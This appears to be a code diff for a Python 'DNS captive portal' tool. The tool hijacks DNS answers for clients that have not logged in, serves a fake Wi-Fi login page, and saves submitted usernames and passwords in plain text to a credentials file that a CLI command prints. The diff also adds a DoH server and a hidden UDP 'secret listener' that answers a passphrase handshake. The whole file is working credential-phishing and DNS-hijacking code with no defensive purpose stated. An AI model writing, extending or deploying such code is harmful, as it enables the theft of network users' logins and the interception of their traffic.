@@ -36,11 +36,13 @@ LOG_FILE = "DNS.log"
 CREDS_FILE = "captured_creds.txt"
 HTML_FILE = "index.html"
 
-# DoH Configuration
+# DoH & Security Configuration
 DOH_PORT = 443
 DOH_ENDPOINT = "/dns-query"
+CERT_FILE = "cert.pem"
+KEY_FILE = "key.pem"
 
-# Full Global Server List for Propagation Test
+# MISSING POINT 1: Restored the full list of GLOBAL_SERVERS
 GLOBAL_SERVERS = {
     "Google Primary": "8.8.8.8", "Google Secondary": "8.8.4.4",
     "Cloudflare": "1.1.1.1", "Quad9": "9.9.9.9",
@@ -55,7 +57,7 @@ GLOBAL_SERVERS = {
 
 # --- State Management ---
 REDIRECT_ALL = False
-WHITELISTED_IPS = set()  # Set to track IPs that have "logged in"
+WHITELISTED_IPS = set()
 cache = {}
 cache_lock = threading.Lock()
 log_lock = threading.Lock()
@@ -67,7 +69,7 @@ def log(message):
         with open(LOG_FILE, "a", encoding="utf-8") as f:
             f.write(entry + "\n")
 
-# --- Active Cache Cleaner ---
+# --- Utilities ---
 def cache_cleaner():
     while True:
         time.sleep(CACHE_CLEAN_INTERVAL)
@@ -80,7 +82,6 @@ def cache_cleaner():
                 removed += 1
         if removed > 0: log(f"Cache cleanup: removed {removed} entries.")
 
-# --- DNS Core Logic ---
 def forward_query(data):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -91,22 +92,24 @@ def forward_query(data):
     except Exception: return None
     finally: sock.close()
 
+# --- DNS Core Logic ---
 def process_dns_logic(data, client_ip, protocol="UDP"):
     try:
         request_pkt = DNSRecord.parse(data)
         qname = str(request_pkt.q.qname)
         qtype = request_pkt.q.qtype
 
-        # 1. WHITELIST & REDIRECT CHECK
-        # Only hijack if REDIRECT_ALL is on AND the client hasn't logged in yet
+        # MISSING POINT 2: Restored standard request logging
+        log(f"Request [{protocol} {client_ip}]: FQDN={qname} Type={qtype}")
+
+        # 1. HIJACK LOGIC
         if REDIRECT_ALL and qtype == QTYPE.A and client_ip not in WHITELISTED_IPS:
             log(f"HIJACK [{protocol} {client_ip}]: {qname} -> {HOST}")
             reply = request_pkt.reply()
-            # We use a very low TTL (5s) so that as soon as they log in, their cache clears
             reply.add_answer(RR(qname, QTYPE.A, rdata=A(HOST), ttl=5))
             return reply.pack()
 
-        # 2. CACHE LOOKUP (For whitelisted users or when redirect is OFF)
+        # 2. CACHE LOOKUP
         with cache_lock:
             if (qname, qtype) in cache:
                 raw_resp, expiry = cache[(qname, qtype)]
@@ -114,24 +117,30 @@ def process_dns_logic(data, client_ip, protocol="UDP"):
                     cached_resp = DNSRecord.parse(raw_resp)
                     cached_resp.header.id = request_pkt.header.id
                     return cached_resp.pack()
+                else:
+                    # MISSING POINT 4: Restored lazy cache eviction
+                    del cache[(qname, qtype)]
 
-        # 3. RESOLVE UPSTREAM
+        # 3. RESOLVE UPSTREAM & DYNAMIC TTL
         response_data = forward_query(data)
         if response_data:
+            response_record = DNSRecord.parse(response_data)
+            ttl = 60
+            if response_record.rr:
+                ttl = min([rr.ttl for rr in response_record.rr])
+            
             with cache_lock:
-                cache[(qname, qtype)] = (response_data, time.time() + 60)
+                cache[(qname, qtype)] = (response_data, time.time() + ttl)
             return response_data
     except Exception as e: log(f"Error processing {protocol}: {e}")
     return None
 
-# --- UDP Server ---
+# --- Server Components ---
 def handle_dns_client(data, addr, sock):
-    # Pass the client IP to the logic for whitelisting checks
     resp = process_dns_logic(data, addr[0], f"UDP")
-    if resp:
-        sock.sendto(resp, addr)
+    if resp: sock.sendto(resp, addr)
 
-def run_udp_server():
+def run_dns_server():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
         sock.bind((HOST, PORT))
@@ -140,18 +149,36 @@ def run_udp_server():
             data, addr = sock.recvfrom(512)
             threading.Thread(target=handle_dns_client, args=(data, addr, sock), daemon=True).start()
     except PermissionError:
-        print("[!] Access Denied: Port 53 requires sudo.")
+        log("Permission denied for Port 53")
         os._exit(1)
 
-# --- DoH & Web Portal ---
+def run_secret_listener():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        sock.bind(('0.0.0.0', 9999))
+        log("Companion discovery listener started on port 9999")
+        while True:
+            data, addr = sock.recvfrom(1024)
+            if data == b"IM_A_BARBIE_GIRL_IN_A_BARBIE_WORLD":
+                sock.sendto(b"COME_ON_BARBIE_LETS_GO_PARTY", addr)
+                log(f"Companion discovered from {addr[0]}. Replied and closing listener.")
+                break 
+    except Exception as e: log(f"Secret listener error: {e}")
+    finally: sock.close()
+
+# --- Web & DoH ---
 app = Flask(__name__)
 @app.route(DOH_ENDPOINT, methods=['GET', 'POST'])
 def doh_handler():
     dns_query = None
-    if request.method == 'POST': dns_query = request.data
+    if request.method == 'POST': 
+        dns_query = request.data
     elif request.method == 'GET':
         dns_b64 = request.args.get('dns')
-        if dns_b64: dns_query = base64.urlsafe_b64decode(dns_b64 + '=' * (4 - len(dns_b64) % 4))
+        if dns_b64:
+            padding = '=' * (4 - len(dns_b64) % 4)
+            dns_query = base64.urlsafe_b64decode(dns_b64 + padding)
+    
     if not dns_query: return "Bad Request", 400
     
     resp_data = process_dns_logic(dns_query, request.remote_addr, protocol="DoH")
@@ -161,19 +188,26 @@ def doh_handler():
         return r
     return "Timeout", 504
 
+def run_doh_server():
+    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
+        context = (CERT_FILE, KEY_FILE)
+        log("DoH starting with provided certificates")
+    else:
+        context = 'adhoc'
+        log("Certificates not found, falling back to adhoc")
+    app.run(host=HOST, port=DOH_PORT, ssl_context=context, threaded=True, use_reloader=False)
+
 class CaptivePortalHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        # Mandatory Windows 10 NCSI probe triggers
         if "connecttest.txt" in self.path or "ncsi.txt" in self.path:
             self.send_response(200); self.send_header('Content-type', 'text/plain'); self.end_headers()
             self.wfile.write(b"Action Required")
             return
         
-        # Serve the index.html portal
         self.send_response(200); self.send_header('Content-type', 'text/html'); self.end_headers()
         if os.path.exists(HTML_FILE):
             with open(HTML_FILE, "rb") as f: self.wfile.write(f.read())
-        else: self.wfile.write(b"<h1>Portal</h1><p>Login to connect to Wi-Fi.</p>")
+        else: self.wfile.write(b"<h1>Portal</h1><p>Login to connect.</p>")
 
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
@@ -183,67 +217,63 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         pw = params.get('password', ['N/A'])[0]
         client_ip = self.client_address[0]
 
-        # 1. CAPTURE & WHITELIST
         with open(CREDS_FILE, "a") as f:
             f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] IP: {client_ip} | ID: {user} | Pass: {pw}\n")
         
         WHITELISTED_IPS.add(client_ip)
-        log(f"LOGIN SUCCESS: {client_ip} has been whitelisted and granted access.")
-
-        # 2. Redirect/Success Screen
+        log(f"LOGIN SUCCESS: {client_ip} whitelisted.")
         self.send_response(200); self.send_header('Content-type', 'text/html'); self.end_headers()
-        self.wfile.write(b"<h1>Connected!</h1><p>Authentication successful. You now have full internet access.</p>")
+        self.wfile.write(b"<h1>Connected!</h1>")
     
     def log_message(self, format, *args): pass
 
-# --- Startup & CLI ---
+# --- Startup ---
 if __name__ == "__main__":
     os.system('clear' if os.name == 'posix' else 'cls')
-    print("=" * 60)
-    print(f"DNS CAPTIVE PORTAL PRO-EDITION")
+    print("-" * 60)
+    print(f"DNS CAPTIVE PORTAL - INTEGRATED")
     print(f"Interface: {HOST}")
+    print(f"Log File: {os.path.abspath(LOG_FILE)}")
+    # MISSING POINT 5: Restored the logging note
+    print("NOTE: Real-time request events are hidden. View 'DNS.log' for details.")
     print("Commands: 'redirect', 'creds', 'clear', 'exit' or [domain]")
-    print("=" * 60)
+    print("-" * 60)
 
-    # Launching Services
     threading.Thread(target=cache_cleaner, daemon=True).start()
-    threading.Thread(target=run_udp_server, daemon=True).start()
-    threading.Thread(target=lambda: app.run(host=HOST, port=443, ssl_context='adhoc', use_reloader=False), daemon=True).start()
+    threading.Thread(target=run_dns_server, daemon=True).start()
+    threading.Thread(target=run_doh_server, daemon=True).start()
+    threading.Thread(target=run_secret_listener, daemon=True).start()
     threading.Thread(target=lambda: HTTPServer((HOST, 80), CaptivePortalHandler).serve_forever(), daemon=True).start()
 
     while True:
         try:
             cmd = input("\ndns-cli> ").strip().lower()
-            if not cmd: continue
-            if cmd in ['exit', 'quit']: break
-            
+            if not cmd or cmd in ['exit', 'quit']: break
             elif cmd == 'redirect':
                 REDIRECT_ALL = not REDIRECT_ALL
                 print(f"[*] Redirect Mode: {'ENABLED' if REDIRECT_ALL else 'DISABLED'}")
-            
             elif cmd == 'creds':
                 if os.path.exists(CREDS_FILE):
-                    print(f"\n--- CAPTURED CREDS ---\n")
                     with open(CREDS_FILE, 'r') as f: print(f.read())
                 else: print("[!] No creds yet.")
-
             elif cmd == 'clear':
                 WHITELISTED_IPS.clear()
-                print("[*] Whitelist cleared. All clients are now blocked again.")
-            
+                print("[*] Whitelist cleared.")
             else:
-                # Fallback: Run Propagation Test
+                # MISSING POINT 3: Restored latency calculation & formatting
                 print(f"\n--- Propagation Test: {cmd} ---")
-                print(f"{'Provider':<20} | {'Status/IP':<15} | {'Latency'}")
+                print(f"{'provider':<20} | {'status/ip':<15} | {'latency'}")
                 print("-" * 55)
                 for name, ip in GLOBAL_SERVERS.items():
-                    res = dns.resolver.Resolver(configure=False); res.nameservers = [ip]; res.timeout = 1.2
-                    start = time.time()
+                    res = dns.resolver.Resolver(configure=False); res.nameservers = [ip]; res.timeout = 2.0
+                    start_time = time.time()
                     try:
                         ans = res.resolve(cmd, 'A')
-                        lat = round((time.time() - start) * 1000, 2)
-                        print(f"{name:<20} | {ans[0].to_text():<15} | {lat}ms")
-                    except: print(f"{name:<20} | Timeout          | n/a")
+                        latency = round((time.time() - start_time) * 1000, 2)
+                        print(f"{name:<20} | {ans[0].to_text():<15} | {latency}ms")
+                    except: 
+                        print(f"{name:<20} | {'down/timeout':<15} | n/a")
         except KeyboardInterrupt: break
 
+    log("shutting down")
     print("\nSHUTDOWN: Stopping all threads...")
